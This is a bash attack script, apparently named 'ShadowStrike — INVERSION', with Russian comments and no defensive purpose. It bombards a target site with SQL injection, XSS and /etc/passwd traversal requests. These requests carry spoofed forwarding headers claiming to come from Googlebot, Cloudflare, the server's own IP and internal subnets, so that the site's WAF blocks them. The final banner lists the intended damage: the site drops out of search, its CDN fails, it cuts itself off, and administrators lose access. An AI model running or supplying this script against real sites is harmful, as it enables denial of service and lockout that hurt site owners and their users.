#!/bin/bash
# ИНВЕРСИЯ — Превращаем защиту в оружие против владельца
TARGET=$1
[ -z "$TARGET" ] && echo "Usage: $0 http://target.com" && exit 1

DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
SERVER_IP=$(dig +short "$DOMAIN" 2>/dev/null | head -1)

echo "╔══════════════════════════════════════════════╗"
echo "║   ShadowStrike — INVERSION                  ║"
echo "║   Превращаем защиту в оружие                ║"
echo "╚══════════════════════════════════════════════╝"
echo ""
echo "[INVERSION] Цель: $DOMAIN ($SERVER_IP)"
echo ""

# Фаза 1: Заставляем WAF блокировать поисковиков
echo "[INVERSION] Фаза 1: Блокировка Google..."
for ip in "66.249.64.1" "66.249.64.2" "66.249.64.3" "66.102.0.1" "66.102.0.2"; do
    for i in {1..50}; do
        curl -sk --max-time 2 \
            -H "X-Forwarded-For: $ip" \
            -H "User-Agent: Googlebot/2.1" \
            "$TARGET?id=1' OR '1'='1" -o /dev/null 2>/dev/null &
    done
    echo "  🕷️ Googlebot IP $ip — атакован"
done
wait

# Фаза 2: Заставляем WAF блокировать Cloudflare
echo "[INVERSION] Фаза 2: Блокировка Cloudflare..."
for ip in "103.21.244.0" "103.22.200.0" "103.31.4.0" "104.16.0.0" "172.64.0.0"; do
    for i in {1..50}; do
        curl -sk --max-time 2 \
            -H "X-Forwarded-For: $ip" \
            "$TARGET?id=<script>alert(1)</script>" -o /dev/null 2>/dev/null &
    done
    echo "  ☁️ Cloudflare IP $ip — атакован"
done
wait

# Фаза 3: Заставляем WAF блокировать самого себя
echo "[INVERSION] Фаза 3: Блокировка самого сервера..."
for i in {1..100}; do
    curl -sk --max-time 2 \
        -H "X-Forwarded-For: $SERVER_IP" \
        -H "X-Real-IP: $SERVER_IP" \
        -H "X-Client-IP: $SERVER_IP" \
        -H "True-Client-IP: $SERVER_IP" \
        "$TARGET?id=1' OR '1'='1" -o /dev/null 2>/dev/null &
done
wait

# Фаза 4: Заставляем WAF блокировать внутренние IP
echo "[INVERSION] Фаза 4: Блокировка внутренней сети..."
for subnet in "10.0.0" "192.168.1" "172.16.0" "172.16.1" "127.0.0"; do
    for host in {1..10}; do
        ip="$subnet.$host"
        for i in {1..30}; do
            curl -sk --max-time 2 \
                -H "X-Forwarded-For: $ip" \
                "$TARGET?id=../../etc/passwd" -o /dev/null 2>/dev/null &
        done
    done
    echo "  🔒 Подсеть $subnet.* — атакована"
done
wait

echo ""
echo "══════════════════════════════════════════════"
echo "  [INVERSION] Атака завершена"
echo ""
echo "  Если WAF блокирует:"
echo "  🔴 Google — сайт исчез из поиска"
echo "  🔴 Cloudflare — CDN не работает"
echo "  🔴 Сервер — сайт не может подключиться сам к себе"
echo "  🔴 Внутренняя сеть — админы теряют доступ"
echo ""
echo "  ЗАЩИТА СТАЛА ОРУЖИЕМ"
echo "══════════════════════════════════════════════"
